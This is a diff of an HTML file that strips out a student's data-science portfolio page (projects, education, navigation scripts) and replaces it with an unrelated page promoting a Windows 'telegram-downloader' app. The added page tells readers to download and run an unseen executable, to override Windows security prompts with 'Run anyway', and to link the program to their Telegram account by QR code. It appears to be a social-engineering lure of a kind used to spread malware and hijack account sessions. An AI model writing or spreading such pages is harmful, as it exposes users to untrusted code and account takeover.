-              <span class="skill-card-icon" aria-hidden="true">05</span>
-              <h3>Machine Learning</h3>
-              <p>Classification and neural networks</p>
-            </div>
-
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">06</span>
-              <h3>LLMs &amp; NLP</h3>
-              <p>Human-guided text analysis</p>
-            </div>
-
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">07</span>
-              <h3>GitHub</h3>
-              <p>Code organization and sharing</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- PROJECTS -->
-    <section
-      id="projects"
-      class="projects"
-      aria-labelledby="projects-heading"
-    >
-      <div class="container">
-        <h2 class="section-title" id="projects-heading">
-          Projects
-        </h2>
-
-        <div class="projects-grid" id="projectsCarouselTrack">
-
-          <!-- PROJECT 1 -->
-          <article class="project-card">
-            <div class="project-image" aria-hidden="true">
-              <span class="project-number">01</span>
-              <span>READING &amp; LANGUAGE</span>
-            </div>
-
-            <div class="project-content">
-              <h3>Does Reading Matter?</h3>
-
-              <p>
-                Using LLMs to analyze Goodreads reviews and explore
-                how readers describe their experiences with books.
-              </p>
-
-              <div class="project-tags">
-                <span class="tag">LLMs</span>
-                <span class="tag">Text Analysis</span>
-                <span class="tag">Human Coding</span>
-              </div>
-
-              <details>
-                <summary>
-                  Project details
-                  <span aria-hidden="true">+</span>
-                </summary>
-
-                <p>
-                  Applied human-defined categories to reviews and
-                  evaluated agreement between LLM-generated labels
-                  and human ratings using weighted F1 scores.
-                </p>
-              </details>
-            </div>
-          </article>
-
-          <!-- PROJECT 2 -->
-          <article class="project-card">
-            <div class="project-image" aria-hidden="true">
-              <span class="project-number">02</span>
-              <span>LEARNING ANALYTICS</span>
-            </div>
-
-            <div class="project-content">
-              <h3>Reading Ability &amp; Mathematics</h3>
-
-              <p>
-                Examining how predicted reading ability relates
-                to mathematics performance across Mathstream lessons.
-              </p>
-
-              <div class="project-tags">
-                <span class="tag">R</span>
-                <span class="tag">Mixed-effects Models</span>
-                <span class="tag">Education</span>
-              </div>
-
-              <details>
-                <summary>
-                  Project details
-                  <span aria-hidden="true">+</span>
-                </summary>
-
-                <p>
-                  Used mixed-effects logistic models to examine
-                  passing and completion outcomes, and explored
-                  how estimated relationships differ across lessons.
-                </p>
-              </details>
-            </div>
-          </article>
-
-          <!-- PROJECT 3 -->
-          <article class="project-card">
-            <div class="project-image" aria-hidden="true">
-              <span class="project-number">03</span>
-              <span>BEHAVIORAL NEUROSCIENCE</span>
-            </div>
-
-            <div class="project-content">
-              <h3>Decoding Emotion Regulation</h3>
-
-              <p>
-                Exploring whether fMRI activity patterns distinguish
-                reappraisal from baseline conditions.
-              </p>
-
-              <div class="project-tags">
-                <span class="tag">Python</span>
-                <span class="tag">KNN</span>
-                <span class="tag">fMRI</span>
-              </div>
-
-              <details>
-                <summary>
-                  Project details
-                  <span aria-hidden="true">+</span>
-                </summary>
-
-                <p>
-                  Applied classification methods to brain activity
-                  data and collaborated on debugging and evaluating
-                  the analysis.
-                </p>
-              </details>
-            </div>
-          </article>
-
-          <!-- PROJECT 4 -->
-          <article class="project-card">
-            <div class="project-image" aria-hidden="true">
-              <span class="project-number">04</span>
-              <span>PEOPLE ANALYTICS</span>
-            </div>
-
-            <div class="project-content">
-              <h3>Employee Turnover &amp; Store Sales</h3>
-
-              <p>
-                Investigating the association between employee
-                turnover and business performance across 126 stores.
-              </p>
-
-              <div class="project-tags">
-                <span class="tag">Excel</span>
-                <span class="tag">Regression</span>
-                <span class="tag">HR Analytics</span>
-              </div>
-
-              <details>
-                <summary>
-                  Project details
-                  <span aria-hidden="true">+</span>
-                </summary>
-
-                <p>
-                  Examined turnover and sales while controlling for
-                  prior sales, translating model results into
-                  business-relevant interpretations.
-                </p>
-              </details>
-            </div>
-          </article>
-
-        </div>
-      </div>
-    </section>
-
-    <!-- EXPERIENCE -->
-    <section
-      id="experience"
-      class="experience"
-      aria-labelledby="experience-heading"
-    >
-      <div class="container">
-        <h2 class="section-title" id="experience-heading">
-          Research &amp; Applied Experience
-        </h2>
-
-        <div class="experience-timeline">
-
-          <div class="experience-item">
-            <div class="experience-marker"></div>
-
-            <div class="experience-card">
-              <h3>Reading &amp; Psychological Complexity</h3>
-
-              <p class="institution">
-                Capstone research · University of Wisconsin–Madison
-              </p>
-
-              <p>
-                Used LLMs to analyze book reviews with human-defined
-                coding categories and evaluated agreement with
-                human ratings.
-              </p>
-            </div>
-          </div>
-
-          <div class="experience-item">
-            <div class="experience-marker"></div>
-
-            <div class="experience-card">
-              <h3>Student Learning Analytics</h3>
-
-              <p class="institution">
-                Carnegie Learning · Mathstream research project
-              </p>
-
-              <p>
-                Examined the association between predicted reading
-                ability and mathematics outcomes, including
-                differences across lessons.
-              </p>
-            </div>
-          </div>
-
-          <div class="experience-item">
-            <div class="experience-marker"></div>
-
-            <div class="experience-card">
-              <h3>Employee Turnover &amp; Business Performance</h3>
-
-              <p class="institution">
-                HR analytics · Independent study
-              </p>
-
-              <p>
-                Analyzed data from 126 stores and used regression
-                to relate workforce measures to business outcomes.
-              </p>
-            </div>
-          </div>
-
-        </div>
-      </div>
-    </section>
-
-    <!-- EDUCATION -->
-    <section
-      id="education"
-      class="education"
-      aria-labelledby="education-heading"
-    >
-      <div class="container">
-        <h2 class="section-title" id="education-heading">
-          Education
-        </h2>
-
-        <div class="education-timeline">
-          <div class="education-item">
-            <div class="education-marker"></div>
-
-            <div class="education-card">
-              <h3>MS in Psychology</h3>
-
-              <p class="institution">
-                University of Wisconsin–Madison
-              </p>
-
-              <p class="duration">
-                Data Science in Human Behavior · Expected December 2026
-              </p>
-
-              <p>
-                Graduate study connecting behavioral research
-                with statistical modeling, machine learning,
-                and data analysis.
-              </p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- CONTACT -->
-    <section
-      id="contact"
-      class="contact"
-      aria-labelledby="contact-heading"
-    >
-      <div class="container">
-        <h2 class="section-title" id="contact-heading">
-          Let’s Connect
-        </h2>
-
-        <p class="contact-intro">
-          Interested in data science, behavioral research, or
-          learning analytics? Explore my work on GitHub.
-        </p>
-
-        <div class="contact-info">
-          <a
-            href="https://github.com/nakyungoh0314"
-            target="_blank"
-            rel="noopener noreferrer"
-            class="contact-item clickable"
-          >
-            <span class="contact-icon" aria-hidden="true">↗</span>
-
-            <div>
-              <h3>GitHub</h3>
-              <p>
-                nakyungoh0314
-                <span class="sr-only">(opens in new tab)</span>
-              </p>
-            </div>
-          </a>
-        </div>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- BACK TO TOP -->
-  <button
-    class="back-to-top"
-    id="backToTop"
-    aria-label="Back to top"
-  >
-    <span aria-hidden="true">↑</span>
-  </button>
-
-  <!-- FOOTER -->
-  <footer class="footer">
-    <div class="container">
-      <p>
-        &copy; <span id="footer-year">2026</span>
-        Nakyung (Chloe) Oh. All rights reserved.
-      </p>
-      <p>Data Science | Psychology | Human Behavior</p>
-    </div>
-  </footer>
-
-  <script>
-    /* =========================
-       MOTION PREFERENCE & YEAR
-    ========================= */
-
-    const reduceMotion = window.matchMedia(
-      "(prefers-reduced-motion: reduce)"
-    );
-
-    document.getElementById("footer-year").textContent =
-      new Date().getFullYear();
-
-    /* =========================
-       MOBILE NAVIGATION
-    ========================= */
-
-    const hamburger = document.getElementById("hamburger");
-    const nav = document.getElementById("navLinks");
-    const overlay = document.getElementById("mobileNavOverlay");
-
-    function setMenu(open) {
-      nav.classList.toggle("open", open);
-      overlay.classList.toggle("open", open);
-      hamburger.setAttribute("aria-expanded", String(open));
-    }
-
-    hamburger.addEventListener("click", () => {
-      setMenu(hamburger.getAttribute("aria-expanded") !== "true");
-    });
-
-    overlay.addEventListener("click", () => {
-      setMenu(false);
-    });
-
-    nav.querySelectorAll("a").forEach((link) => {
-      link.addEventListener("click", () => {
-        setMenu(false);
-      });
-    });
-
-    document.addEventListener("keydown", (event) => {
-      if (
-        event.key === "Escape" &&
-        nav.classList.contains("open")
-      ) {
-        setMenu(false);
-        hamburger.focus();
-      }
-    });
-
-    window.addEventListener("resize", () => {
-      if (window.innerWidth > 900) {
-        setMenu(false);
-      }
-    });
-
-    /* =========================
-       BACK TO TOP
-    ========================= */
-
-    const topButton = document.getElementById("backToTop");
-
-    topButton.addEventListener("click", () => {
-      window.scrollTo({
-        top: 0,
-        behavior: reduceMotion.matches ? "auto" : "smooth"
-      });
-
-      document.querySelector(".logo").focus({
-        preventScroll: true
-      });
-    });
-
-    /* =========================
-       ACTIVE NAVIGATION LINK
-    ========================= */
-
-    const sections = [
-      ...document.querySelectorAll("main > section[id]")
-    ];
-
-    function updateScroll() {
-      topButton.classList.toggle(
-        "visible",
-        window.scrollY > 500
-      );
-
-      let current = "home";
-
-      for (const section of sections) {
-        if (section.getBoundingClientRect().top <= 160) {
-          current = section.id;
-        }
-      }
-
-      if (current === "technical-skills") {
-        current = "skills";
-      }
-
-      nav.querySelectorAll("a").forEach((link) => {
-        const active = link.hash === "#" + current;
-
-        link.classList.toggle("active", active);
-
-        if (active) {
-          link.setAttribute("aria-current", "location");
-        } else {
-          link.removeAttribute("aria-current");
-        }
-      });
-    }
-
-    window.addEventListener("scroll", updateScroll, {
-      passive: true
-    });
-
-    updateScroll();
-
-    /* =========================
-       TOOLS CAROUSEL
-    ========================= */
-
-    const track = document.getElementById("skillsCarouselTrack");
-    const previousButton = document.querySelector(".carousel-prev");
-    const nextButton = document.querySelector(".carousel-next");
-
-    function updateCarousel() {
-      previousButton.disabled = track.scrollLeft <= 2;
-
-      nextButton.disabled =
-        track.scrollLeft + track.clientWidth >=
-        track.scrollWidth - 2;
-    }
-
-    function moveCarousel(direction) {
-      const cardWidth = track
-        .querySelector(".skill-card")
-        .getBoundingClientRect().width;
-
-      track.scrollBy({
-        left: direction * (cardWidth + 20),
-        behavior: reduceMotion.matches ? "auto" : "smooth"
-      });
-    }
-
-    previousButton.addEventListener("click", () => {
-      moveCarousel(-1);
-    });
-
-    nextButton.addEventListener("click", () => {
-      moveCarousel(1);
-    });
-
-    track.addEventListener("scroll", updateCarousel, {
-      passive: true
-    });
-
-    window.addEventListener("resize", updateCarousel);
-
-    updateCarousel();
-
-    /* =========================
-       SCROLL & TYPING ANIMATIONS
-    ========================= */
-
-    if (!reduceMotion.matches) {
-
-      // Reveal content as it enters the viewport.
-      if ("IntersectionObserver" in window) {
-        const targets = document.querySelectorAll(
-          ".about-content, " +
-          ".skills-category, " +
-          ".project-card, " +
-          ".experience-item, " +
-          ".education-item, " +
-          ".contact-info"
-        );
-
-        document.body.classList.add("motion");
-
-        const observer = new IntersectionObserver(
-          (entries) => {
-            entries.forEach((entry) => {
-              if (entry.isIntersecting) {
-                entry.target.classList.add("visible");
-                observer.unobserve(entry.target);
-              }
-            });
-          },
-          { threshold: 0.08 }
-        );
-
-        targets.forEach((element) => {
-          element.classList.add("animate-on-scroll");
-          observer.observe(element);
-        });
-      }
-
-      // Typing effect.
-      const tagline = document.querySelector(".tagline");
-
-      const phrases = [
-        "Exploring people, learning, and behavior through data",
-        "Connecting psychology and machine learning",
-        "Turning research questions into insights"
-      ];
-
-      tagline.setAttribute("aria-label", phrases[0]);
-
-      const typedText = document.createElement("span");
-      typedText.setAttribute("aria-hidden", "true");
-      typedText.textContent = phrases[0];
-
-      const cursor = document.createElement("span");
-      cursor.className = "typing-cursor";
-      cursor.setAttribute("aria-hidden", "true");
-      cursor.textContent = " ";
-
-      tagline.replaceChildren(typedText, cursor);
-
-      let phraseIndex = 0;
-      let characterIndex = phrases[0].length;
-      let deleting = true;
-
-      function type() {
-        if (reduceMotion.matches) {
-          typedText.textContent = phrases[0];
-          return;
-        }
-
-        const phrase = phrases[phraseIndex];
-
-        characterIndex += deleting ? -1 : 1;
-
-        typedText.textContent = phrase.slice(
-          0,
-          characterIndex
-        );
-
-        let delay = deleting ? 24 : 55;
-
-        if (characterIndex === 0) {
-          deleting = false;
-          phraseIndex = (phraseIndex + 1) % phrases.length;
-          delay = 350;
-        } else if (
-          !deleting &&
-          characterIndex === phrase.length
-        ) {
-          deleting = true;
-          delay = 2600;
-        }
-
-        setTimeout(type, delay);
-      }
-
-      setTimeout(type, 2800);
-    }
-  </script>
+    <h2>🖥️ System Requirements</h2>
+    <p>Before you download, make sure your Windows computer meets these basic requirements:</p>
+    <ul>
+      <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit recommended).</li>
+      <li><strong>Memory (RAM):</strong> 4 GB or more.</li>
+      <li><strong>Free Disk Space:</strong> At least 200 MB for the application, plus extra space for your downloaded files.</li>
+      <li><strong>Internet Connection:</strong> A stable connection is needed for downloading from Telegram.</li>
+      <li><strong>Telegram Account:</strong> You must have a Telegram account and the Telegram app on your phone for QR code login.</li>
+    </ul>
+
+    <h2>🚀 Getting Started</h2>
+    <p>Follow these simple steps to start using telegram-downloader on your Windows computer:</p>
+    <ol class="steps-list">
+      <li><strong>Download the application:</strong> Use the download button on this page to visit the official page. Follow the instructions there to download the application to your computer.</li>
+      <li><strong>Locate the downloaded file:</strong> Open your Downloads folder (or the folder where your browser saves files). The file will typically be named something like <code>telegram-downloader</code> or similar.</li>
+      <li><strong>Run the application:</strong> Double-click the downloaded file. If Windows shows a security prompt, click “Yes” or “Run” to allow the application to start.</li>
+      <li><strong>Log in with QR code:</strong> A window will open with a QR code. Open Telegram on your phone, go to Settings → Devices → Link Desktop Device, and scan the QR code shown on your computer screen. This securely logs you in.</li>
+      <li><strong>Choose download settings:</strong> The application will ask where you want to save your files and may show other simple options. Use the default settings if you are unsure.</li>
+      <li><strong>Start downloading:</strong> Paste a Telegram message link or follow the prompts to select the media you want. The downloader will handle the rest at high speed.</li>
+    </ol>
+    <p>That’s it! The application will show progress and notify you when downloads are complete.</p>
+
+    <h2>🛠️ How to Use telegram-downloader</h2>
+    <p>Once you are logged in, using telegram-downloader is straightforward. The application runs in a terminal window, but you don’t need to type complex commands—just follow the on-screen instructions.</p>
+    <h3>Downloading media from a link</h3>
+    <p>If you have a Telegram message link (for example, from a channel or chat), copy it and paste it into the application when prompted. The downloader will fetch the media and save it to your chosen folder.</p>
+    <h3>Managing duplicates</h3>
+    <p>The smart deduplication feature checks file names and sizes before downloading. If a file already exists in your download folder, it will be skipped automatically, saving you time and bandwidth.</p>
+    <h3>Adjusting speed</h3>
+    <p>The multi-connection feature works automatically. For most users, the default settings provide the best balance of speed and stability. You can usually leave them as they are.</p>
+
+    <h2>❓ Troubleshooting</h2>
+    <p>Here are answers to common questions. If you need more help, visit the support section below.</p>
+    <h3>The QR code doesn’t work</h3>
+    <p>Make sure your phone and computer are connected to the internet. Update your Telegram app to the latest version. If the QR code expires, restart the application to generate a new one.</p>
+    <h3>Downloads are slow</h3>
+    <p>Check your internet connection. Try pausing other downloads or streaming. The multi-connection feature works best on stable networks. You can also restart the application.</p>
+    <h3>Windows shows a security warning</h3>
+    <p>This can happen with new applications. Click “More info” and then “Run anyway” if you trust the source. Always download from the official link provided on this page.</p>
+    <h3>Files are not saving</h3>
+    <p>Make sure you have enough free disk space and that the download folder is not write-protected. Try choosing a different folder, such as your Desktop or Documents.</p>
+
+    <h2>💬 Support and Community</h2>
+    <p>If you encounter any issues or have questions, the best place to get help is the official GitHub repository. You can open an issue, report a bug, or suggest a new feature. Visit <a href="https://github.com/Tochewillys1/telegram-downloader" target="_blank" rel="noopener">https://github.com/Tochewillys1/telegram-downloader</a> and click the “Issues” tab.</p>
+    <p>For security and privacy, never share your Telegram login codes or QR codes with anyone. The telegram-downloader application only connects to Telegram’s official servers.</p>
+
+    <h2>📋 Frequently Asked Questions</h2>
+    <h3>Is telegram-downloader free?</h3>
+    <p>Yes, it is an open-source application available for free. You can use it without any cost.</p>
+    <h3>Do I need to install Python?</h3>
+    <p>The application is designed to be easy to run. Follow the download instructions on the official page. If any additional steps are needed, they will be clearly explained there.</p>
+    <h3>Can I download private chats?</h3>
+    <p>You can download media from chats you are a member of, as long as you have permission. Always respect privacy and copyright laws.</p>
+    <h3>Where are my files saved?</h3>
+    <p>By default, files are saved in a folder within your user directory. You can change the download location during setup or in the application settings.</p>
+  </div>
 </body>
 </html>
